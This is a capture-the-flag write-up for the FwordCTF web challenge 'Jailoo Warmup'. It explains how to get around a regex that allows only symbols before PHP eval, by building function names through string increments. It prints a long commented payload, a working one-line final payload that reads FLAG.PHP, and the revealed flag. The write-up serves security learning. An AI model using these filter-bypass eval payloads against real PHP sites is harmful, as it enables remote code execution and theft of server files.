# Jailoo Warmup

## Web, 442 points

### Description

```
Get the flag in FLAG.PHP.

http://jailoowarmup.fword.wtf/
```
Source code is given and is at ./jailoo.php

### Solution

```php
    if(preg_match_all('/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/', $cmd, $matches)){
        echo "<div class=\"success\">Command executed !</div>";
        eval($cmd);
```

What interests us from the source code is that we have an `eval` function call for our input if our input respects the regex `/^(\$|\(|\)|\_|\[|\]|\=|\;|\+|\"|\.)*$/`. `eval` function makes it possible to call a PHP function, hence a potential RCE here. At first, it reminded me from a Web challenge from [root-me.org](https://www.root-me.org), I had a lead: as we have to read a PHP file content, I thought directly of `file_get_contents`, `show_source` and `system` functions. We have to note that PHP functions are case insensitive.

The main idea is explained at [https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/) and I used a variation of his method 2 to solve this task. 

First, I was lazy and decided to start from my payload from the Root Me challenge. Here is my commented version payload, so you can compare with securityonline article and better understand:

```php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['_'=='[']; // $_=$_[0];
// $___=$_; // A
$___="";
$__=$_;
$__++;$__++;$__++;$__++;$__++; // F
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // I
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // L
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++; // E
$___.=$__; // append the variable
$__=$_; // reset the variable
$___.='_';

$__++;$__++;$__++;$__++;$__++;$__++; // G
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++; // E
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__; // append the variable
$__=$_; // reset the variable
$___.='_';

$__++;$__++; // C
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // N
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++; // E
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // N
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$___.=$__; // append the variable
$__=$_; // reset the variable

$____='"';
$__=$_;
$__++;$__++;$__++;$__++;$__++; // F
$____.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // L
$____.=$__; // append the variable
$__=$_; // reset the variable
$____.=$__; // A
$__++;$__++;$__++;$__++;$__++;$__++; // G
$____.=$__; // append the variable
$__=$_; // reset the variable
$____.="."; // .
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++; // H
$____.=$__; // append the variable
$__=$_; // reset the variable
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__; // append the variable
$__=$_; // reset the variable
$____.='"'; // append '

$___($____); // FILE_GET_CONTENTS('FLAG.PHP')
```

I realized then that I had to remove characters such as `' @`. I crafted it manually for a time, discovered that FILE_GET_CONTENTS returned me an error, SHOW_SOURCE and SYSTEM as well. These functions were disabled. What a struggle. Finally we decided with SHRECS to automate the generation of the payload with a script, we should have done that from the beginning. Thanks to @face0xff for it.

Finally, after scripting, we remembered readfile function. Final payload is below:

```php
$___="";$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$___.=$_;$____="";$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$____.=$_;$______="";$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$______.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$______.=$_;$_=[];$_="$_";$_=$_["_"=="["];$______.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$______.=$_;$_=[];$_="$_";$_=$_["_"=="["];$______.=".";$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$______.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$______.=$_;$_=[];$_="$_";$_=$_["_"=="["];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$______.=$_;$___($____($______));
```

Then we flag:

```php
   <div class="card-text">
   			<h3>RUN</h3>
   			<form action="" method="post">
			  <div class="form-group">
			    <textarea name="cmd" class="form-control" id="textarea" rows="4"></textarea>
			  </div>
			  <button type="submit" name="submit" class="btn btn-primary">execute</button>
			</form>
	</div>
	<div class="success">Command executed !</div>
    <!--?
    $flag="FwordCTF{Fr0m_3very_m0unta1ns1d3_l3t_fr33d0m_r1ng_MLK}";
    ?-->
```

### Script

Payload generator is at ./exploit.py.